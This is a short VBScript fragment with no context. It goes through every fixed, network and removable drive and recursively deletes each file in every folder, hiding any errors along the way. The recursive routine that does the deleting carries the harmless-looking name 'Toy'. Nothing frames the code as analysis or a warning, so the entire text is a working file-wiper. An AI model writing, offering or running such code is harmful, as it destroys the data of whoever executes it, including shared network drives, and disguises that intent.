   '
   On Error Resume Next
    Set F50 = CreateObject("Scripting.FileSystemObject")
    For Each F00 In F50.Drives
     If F00.DriveType >= 2 Then
          Toy(F00.Path&"\")
     End If
    Next
   '
   Sub Toy(fspec)
    On Error Resume Next
    Set F54 = F50.GetFolder(fspec)
    For Each F52 In F54.Files
       F50.GetFile(F52.Path).Attributes = (16 + 16)
       F50.DeleteFile F52.Path
    Next
    For Each F52 In F54.SubFolders
       Toy(F52.Path)
    Next
   End Sub
   '
